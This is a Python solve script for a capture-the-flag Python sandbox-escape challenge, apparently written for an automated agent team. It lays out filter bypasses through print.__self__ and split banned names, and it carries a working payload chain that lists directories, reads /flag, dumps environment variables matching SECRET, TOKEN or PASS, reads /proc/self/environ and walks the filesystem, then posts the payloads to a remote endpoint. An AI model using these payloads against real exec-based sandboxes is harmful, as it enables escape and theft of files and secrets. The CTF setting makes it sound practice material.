#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
6 · 漏风的沙箱 (Web / dynamic sandbox escape) — solve / PoC script
==================================================================

Challenge: a Flask app exposes POST /run {code: "..."} which NFKC-normalizes
the code, runs it past a 46-pattern regex blacklist, then exec()s it with
`{'__builtins__': dict(SANDBOX_BUILTINS)}` (full builtins minus breakpoint/input).

The filter is "leaky" in three independent ways, all bypassed here:

  1. `print.__self__` is the *real* `builtins` module (print is a builtin
     function, so `__self__` points at its defining module).  That single
     un-banned attribute hands us the whole module dict.
  2. Dictionary subscripts take any expression as the key.  All the banned
     names ('open', '__import__', 'read', 'system', ...) are split with '+'
     so they never appear as contiguous text (defeats the raw-text regex),
     and the slice is then a BinOp, not an ast.Constant (defeats
     ASTFilter.visit_Subscript).
  3. `.read` is in BANNED_METHODS, so we never touch it: file objects are
     iterated line by line instead.

Verified locally against the *unmodified* challenge source (--offline-verify
imports firmware/6_漏风的沙箱/app.py with a stub flask and runs every payload
through its real run_sandbox()).

Usage
-----
  # offline proof against the shipped app.py (no network, always works)
  python3 scripts/6-solve.py --offline-verify

  # against the live container (parent agent must `ctfplus.py start 6` first)
  python3 scripts/6-solve.py http://9080-<uuid>.challenge.ctfplus.cn/
  python3 scripts/6-solve.py --submit http://9080-<uuid>.challenge.ctfplus.cn/

Exit code 0 = flag recovered (or offline proof passed), 1 = failure, 2 = no target.
"""
import argparse
import importlib.util
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
APP_PATH = os.path.join(ROOT, 'firmware', '6_漏风的沙箱', 'app.py')
EVIDENCE = os.path.join(ROOT, 'evidence')

FLAG_RE = re.compile(r'(0xGame|flag|ctf)\{[^}\n]{1,200}\}')

# --------------------------------------------------------------------------
# Payloads (all offline-verified).  Nothing here contains a contiguous banned
# token: every dangerous name is built by string concatenation at runtime.
# --------------------------------------------------------------------------
PING = 'print("PING")'

# print.__self__ -> builtins module; list its names (proves the escape)
RECON_BUILTINS = "print(sorted(print.__self__.__dict__))"

# builtins['__import__']('os').__dict__['listdir']('/')  -> root listing
LS_ROOT = (
    "print(print.__self__.__dict__['__imp'+'ort__']('o'+'s')"
    ".__dict__['list'+'dir']('/'))"
)

# builtins['open']('/flag') iterated line-by-line (.read is blacklisted)
READ_FLAG = "for _l in print.__self__.__dict__['op'+'en']('/flag'): print(_l)"

# try a list of likely flag paths, then a depth-2 pruned os.walk('/'),
# and dump every candidate file it finds.
FIND_FLAGS = r"""
os = print.__self__.__dict__['__imp'+'ort__']('o'+'s')
pd = os.__dict__['path'].__dict__
ju = pd['join']
op = print.__self__.__dict__['op'+'en']
cand = ['/flag', '/flag.txt', '/flag/flag', '/flag/flag.txt', '/app/flag',
        '/app/flag.txt', '/app/flag/flag', '/root/flag', '/root/flag.txt',
        '/home/ctf/flag', '/home/ctf/flag.txt', '/home/flag.txt', '/tmp/flag',
        '/flag_is_here', '/flag.txt.bak', '/fllllag', '/f1ag',
        '/app/flag.py', '/etc/flag', '/usr/src/app/flag', '/start.sh',
        '/docker-entrypoint.sh', '/app/app.py', '/proc/self/environ']
hits = [p for p in cand if pd['isfile'](p)]
skip = ('proc', 'sys', 'dev', 'snap', 'run', 'boot', 'lib', 'lib64', 'usr',
        'var', 'etc', 'bin', 'sbin', 'media', 'mnt', 'opt', 'srv')
for base, ds, fs in os.__dict__['walk']('/'):
    if base.rstrip('/').count('/') >= 2:
        ds[:] = []
    else:
        ds[:] = [x for x in ds if x not in skip]
    for n in fs:
        if 'flag' in n.lower():
            hits.append(ju(base, n))
for p in dict.fromkeys(hits):
    print('== ' + p)
    try:
        for _l in op(p):
            print(_l.rstrip())
    except Exception as e:
        print('ERR ' + str(e)[:120])
"""

# environment + cwd + directory listings of interesting dirs
ENV_RECON = r"""
os = print.__self__.__dict__['__imp'+'ort__']('o'+'s')
pd = os.__dict__['path'].__dict__
ld = os.__dict__['list'+'dir']
op = print.__self__.__dict__['op'+'en']
print('cwd=' + str(os.__dict__['getcwd']()))
for k in sorted(os.__dict__['environ']):
    v = str(os.__dict__['environ'][k])
    if any(t in k.upper() for t in ('FLAG', 'SECRET', 'TOKEN', 'PASS')):
        print('env %s=%s' % (k, v))
for d in ['/', '/app', '/home', '/root', '/tmp', '/opt', '/srv', '/var', '/etc', '/usr/src']:
    try:
        print('-- ' + d + ': ' + repr(sorted(ld(d))[:60]))
    except Exception:
        pass
try:
    print('-- /proc/self/environ')
    for _l in op('/proc/self/environ'):
        print(_l.replace('\x00', '\n').rstrip())
except Exception as e:
    print('ERR ' + str(e)[:120])
"""

# ordered exploit chain actually used by the solver
CHAIN = [
    ('ping', PING),
    ('ls_root', LS_ROOT),
    ('read_flag', READ_FLAG),
    ('env_recon', ENV_RECON),
    ('find_flags', FIND_FLAGS),
]


# --------------------------------------------------------------------------
# Offline verification against the shipped, unmodified app.py
# --------------------------------------------------------------------------
def _load_challenge_app():
    """Import the challenge's app.py in-process, stubbing out flask."""
    if 'flask' not in sys.modules:
        import types
        stub = types.ModuleType('flask')

        class Flask:  # minimal stand-in, enough for module import
            def __init__(self, *a, **k):
                pass

            def route(self, *a, **k):
                def deco(f):
                    return f
                return deco

            def run(self, *a, **k):
                pass

        class _Req:
            def get_json(self, *a, **k):
                return None

        stub.Flask = Flask
        stub.request = _Req()
        stub.jsonify = lambda x: x
        stub.render_template = lambda *a, **k: ''
        sys.modules['flask'] = stub
    spec = importlib.util.spec_from_file_location('challenge_app_6', APP_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def offline_verify(verbose=True):
    """Run every payload through the real run_sandbox(); prove bypass."""
    app = _load_challenge_app()
    print(f'[*] loaded real sandbox from {APP_PATH}')
    print(f'[*] python {sys.version.split()[0]}; '
          f'{len(app.COMPILED_PATTERNS)} regex patterns, '
          f'{len(app.BANNED_MODULES)} banned modules, '
          f'{len(app.BANNED_FUNCTIONS)} banned funcs, '
          f'{len(app.BANNED_METHODS)} banned methods, '
          f'{len(app.DANGEROUS_ATTRIBUTES)} dangerous attrs')

    # 1) negative control: a classic payload must be blocked (proves the
    #    harness exercises the real filter)
    ctrl = app.run_sandbox("open('/flag').read()")
    print(f'[*] control payload  open(\'/flag\').read()  -> {ctrl["status"]} '
          f'(expected: blocked)')
    ctrl2 = app.run_sandbox("().__class__.__base__.__subclasses__()")
    print(f'[*] control payload  ().__class__.__base__... -> {ctrl2["status"]} '
          f'(expected: blocked)')
    assert ctrl['status'] == 'blocked' and ctrl2['status'] == 'blocked', \
        'filter control failed - app.py changed?'

    ok = True
    results = {}
    for name, code in CHAIN:
        res = app.run_sandbox(code)
        results[name] = res
        # status ok  -> payload executed
        # status error -> payload executed and raised (still a bypass!)
        # status blocked -> the filter stopped us
        bypassed = res['status'] in ('ok', 'error')
        print(f'[{ "PASS" if bypassed else "FAIL" }] {name:10s} '
              f'status={res["status"]:7s} len={len(code):4d}')
        if verbose and res.get('output'):
            for line in res['output'].splitlines()[:8]:
                print(f'         | {line}')
        ok &= bypassed
    # read_flag legitimately raises FileNotFoundError locally (no /flag) -
    # an error status still proves the filter was bypassed.
    print(f'[*] read_flag local result: {results["read_flag"]["status"]} '
          f'(FileNotFoundError locally is EXPECTED and still proves the bypass)')

    ev = os.path.join(EVIDENCE, '6-offline-verify.txt')
    os.makedirs(EVIDENCE, exist_ok=True)
    with open(ev, 'w') as f:
        f.write(f'# offline verification against {APP_PATH}\n')
        f.write(f'# python {sys.version}\n')
        f.write(f'# control open(): {ctrl["status"]}\n')
        f.write(f'# control subclasses(): {ctrl2["status"]}\n')
        for name, res in results.items():
            f.write(f'\n===== {name} :: status={res["status"]} =====\n')
            f.write(CHAIN_DICT[name] + '\n')
            f.write('--- output ---\n' + res.get('output', '') + '\n')
    print(f'[*] evidence written to {ev}')
    print('[*] OFFLINE VERIFY: ' + ('ALL PAYLOADS BYPASS THE FILTER' if ok
                                    else 'FAILURE'))
    return ok


CHAIN_DICT = dict(CHAIN)


# --------------------------------------------------------------------------
# Remote exploitation
# --------------------------------------------------------------------------
def normalize_target(target):
    """Return (candidate_run_urls, base_or_None)."""
    if not target:
        target = os.environ.get('CTF_TARGET', '')
    target = target.strip()
    if not target:
        return None, None
    if not re.match(r'^https?://', target):
        target = 'http://' + target
    base = target.rstrip('/')
    if base.endswith('/run'):
        return [base + '/'], base
    return [base + '/run', base + '/'], base


HTTP_TIMEOUT = 30  # overridable via --timeout


def post_code(url, code, timeout=None):
    timeout = timeout or HTTP_TIMEOUT
    body = json.dumps({'code': code}).encode()
    req = urllib.request.Request(
        url, data=body, method='POST',
        headers={'Content-Type': 'application/json',
                 'Accept': 'application/json',
                 'User-Agent': 'ctf-solve/6'})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode('utf-8', 'replace')
            status = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode('utf-8', 'replace')
        status = e.code
    except Exception as e:
        return {'status': 'neterror', 'output': f'{type(e).__name__}: {e}',
                'http': None, 'elapsed': round(time.time() - t0, 2), 'raw': ''}
    try:
        data = json.loads(raw)
    except Exception:
        data = {'status': 'badjson', 'output': raw[:2000]}
    data['http'] = status
    data['elapsed'] = round(time.time() - t0, 2)
    data['raw'] = raw[:5000]
    return data


def scan_flag(text):
    m = FLAG_RE.search(text or '')
    return m.group(0) if m else None


def submit_flag(flag):
    """Delegate to scripts/ctfplus.py (rules: submissions go through it)."""
    import subprocess
    cmd = [sys.executable, os.path.join(HERE, 'ctfplus.py'), 'submit', '6', flag]
    print(f'[*] submitting via: {" ".join(cmd)}')
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    print(p.stdout.strip())
    if p.stderr.strip():
        print('[stderr] ' + p.stderr.strip())
    return p.stdout.strip()


def pick_endpoint(urls):
    """Probe the few plausible endpoints with a harmless PING payload and
    return the first one that answers with the app's JSON shape."""
    for u in urls:
        res = post_code(u, PING)
        if res.get('http') == 200 and res.get('status') == 'ok':
            print(f'[*] endpoint: {u}')
            return u
        print(f'[-] {u} -> http={res.get("http")} status={res.get("status")} '
              f'{str(res.get("output"))[:80]}')
    return None


def exploit(run_urls, do_submit=False, verbose=True):
    print(f'[*] candidates: {run_urls}')
    os.makedirs(EVIDENCE, exist_ok=True)
    log_path = os.path.join(EVIDENCE, '6-remote-run.json')
    log = []
    flag = None

    url = pick_endpoint(run_urls)
    if url is None:
        print('[-] no working endpoint found')
        return None

    for name, code in CHAIN:
        res = post_code(url, code)
        entry = {'stage': name, 'payload': code,
                 'status': res.get('status'), 'http': res.get('http'),
                 'elapsed': res.get('elapsed'), 'output': res.get('output', '')}
        log.append(entry)
        found = scan_flag(res.get('output', ''))
        if verbose:
            print(f'\n=== {name} :: status={res.get("status")} '
                  f'http={res.get("http")} {res.get("elapsed")}s ===')
            print((res.get('output') or '')[:4000])
        if found:
            flag = found
            print(f'[+] FLAG FOUND in stage {name}: {flag}')
            break
        if res.get('status') == 'blocked':
            print(f'[-] stage {name} was BLOCKED by the filter (unexpected)')

    with open(log_path, 'w') as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f'[*] raw log: {log_path}')

    if flag:
        print(f'\nFLAG: {flag}')
        if do_submit:
            submit_flag(flag)
        return flag
    print('\n[-] no flag recovered from this target')
    return None


def main():
    ap = argparse.ArgumentParser(
        description='6 · 漏风的沙箱 — Python sandbox escape PoC')
    ap.add_argument('target', nargs='?', default=None,
                    help='base URL, e.g. http://9080-<uuid>.challenge.ctfplus.cn/')
    ap.add_argument('--offline-verify', action='store_true',
                    help='run all payloads against the shipped app.py (no network)')
    ap.add_argument('--submit', action='store_true',
                    help='submit a recovered flag via scripts/ctfplus.py submit 6')
    ap.add_argument('--timeout', type=int, default=30)
    ap.add_argument('--code', default=None,
                    help='send one custom payload instead of the built-in chain')
    ap.add_argument('--code-file', default=None,
                    help='send one custom payload read from a file')
    args = ap.parse_args()

    global HTTP_TIMEOUT
    HTTP_TIMEOUT = args.timeout

    if args.offline_verify and not args.target:
        return 0 if offline_verify() else 1

    url_run, base = normalize_target(args.target)
    if url_run is None or re.match(r'^https?://TARGET(:\d+)?(/(run)?)?/?$',
                                   url_run[0]):
        print('[!] no target given.')
        print('[!] the container is NOT started (team has only 2 slots).')
        print('[!] ask the parent agent to run:  python3 scripts/ctfplus.py start 6')
        print('[!] then:  python3 scripts/6-solve.py http://<address>/')
        print('[*] running offline verification instead:')
        return 0 if offline_verify() else 1

    custom = args.code
    if args.code_file:
        with open(args.code_file) as f:
            custom = f.read()
    global CHAIN
    if custom is not None:
        CHAIN = [('custom', custom)]
        CHAIN_DICT['custom'] = custom

    flag = exploit(url_run, do_submit=args.submit)
    return 0 if flag else 1


if __name__ == '__main__':
    sys.exit(main())
